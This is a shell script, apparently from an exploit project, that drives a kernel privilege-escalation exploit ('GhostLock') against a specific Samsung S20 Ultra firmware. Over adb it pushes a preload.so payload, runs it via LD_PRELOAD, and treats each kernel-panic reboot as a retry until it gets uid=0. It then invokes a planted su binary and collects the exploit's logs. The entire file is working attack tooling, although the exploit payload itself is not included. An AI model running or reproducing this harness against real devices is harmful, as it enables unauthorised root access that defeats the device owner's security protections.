#!/bin/sh
# One-shot root driver for the S20 Ultra (z3q, G988USQSDHYG2).
#
# GhostLock's pselect race is probabilistic and CONFIG_PANIC_ON_OOPS=y turns a
# failed attempt into an instant reboot. This loop treats a reboot as a retry:
# push the payload, run it, wait for the device to come back, go again.
#
# Usage: scripts/root-z3q.sh <serial> <preload.so> [max_tries]
set -u
SERIAL=${1:?serial required}
PRELOAD=${2:?preload.so path required}
MAX=${3:-8}

adb -s "$SERIAL" push "$PRELOAD" /data/local/tmp/preload.so || exit 1
adb -s "$SERIAL" shell "chmod 644 /data/local/tmp/preload.so"

try=1
while [ "$try" -le "$MAX" ]; do
  echo "=== attempt $try/$MAX ==="
  OUT=$(adb -s "$SERIAL" shell "LD_PRELOAD=/data/local/tmp/preload.so id" 2>&1 | tr -d '\r')
  echo "$OUT" | tail -2
  if echo "$OUT" | grep -q "uid=0"; then
    echo "=== ROOTED (attempt $try) ==="
    adb -s "$SERIAL" shell "/data/local/tmp/su -c id"
    exit 0
  fi
  # a panic shows up as the shell dying / device vanishing; wait for reboot
  echo "attempt $try failed; waiting for device..."
  adb -s "$SERIAL" wait-for-device 2>/dev/null
  sleep 20
  # collect the fsync'd log the exploit wrote before the panic (this lab
  # phone has no /sdcard storage, so logs land in /data/local/tmp)
  for logdir in /sdcard/Download /data/local/tmp; do
    adb -s "$SERIAL" shell "ls -t $logdir/log_*.txt 2>/dev/null | head -1" | tr -d '\r' | while read -r log; do
      [ -n "$log" ] && adb -s "$SERIAL" shell "tail -8 $log"
    done
  done
  try=$((try + 1))
done
echo "=== no success after $MAX attempts; inspect /sdcard/Download/log_*.txt ==="
exit 1
